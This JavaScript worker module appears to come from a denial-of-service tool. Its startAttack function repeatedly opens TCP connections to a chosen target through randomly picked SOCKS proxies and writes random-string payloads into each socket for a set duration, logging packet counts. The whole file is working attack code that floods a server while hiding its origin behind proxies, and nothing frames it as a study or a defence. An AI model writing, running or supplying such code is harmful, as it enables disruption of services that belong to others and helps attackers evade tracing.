import net from "net";
import { SocksProxyAgent } from "socks-proxy-agent";
import { parentPort, workerData } from "worker_threads";

import { randomString } from "../utils/randomUtils.js";

const startAttack = () => {
  const { target, proxies, duration, packetDelay, packetSize } = workerData;

  const [targetHost, targetPort] = target.split(":");
  const port = parseInt(targetPort, 10);
  const fixedTarget = target.startsWith("http") ? target : `tcp://${target}`;

  let totalPackets = 0;
  const startTime = Date.now();

  const sendPacket = async (proxy) => {
    const socket = new net.Socket();
    let open = false;
    socket.setTimeout(2000);

    const proxyAgent = new SocksProxyAgent(
      `${proxy.protocol}://${proxy.host}:${proxy.port}`
    );

    setInterval(() => {
      if (socket.writable && open) {
        socket.write(randomString(packetSize));
      }
    }, [1000]);

    socket.connect({ host: targetHost, port: port, agent: proxyAgent }, () => {
      totalPackets++;
      open = true;
      parentPort.postMessage({
        log: `✅ Packet sent from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`,
        totalPackets,
      });
    });

    socket.on("close", () => {
      open = false;
    });

    socket.on("timeout", () => {
      socket.destroy();
      open = false;
    });

    socket.on("error", (err) => {
      parentPort.postMessage({
        log: `❌ Packet failed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}: ${err.message}`,
        totalPackets,
      });
    });
  };

  const interval = setInterval(() => {
    const elapsedTime = (Date.now() - startTime) / 1000;

    if (elapsedTime >= duration) {
      clearInterval(interval);
      parentPort.postMessage({ log: "Attack finished", totalPackets });
      process.exit(0);
    }

    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    sendPacket(proxy);
  }, packetDelay);
};

if (workerData) {
  startAttack();
}
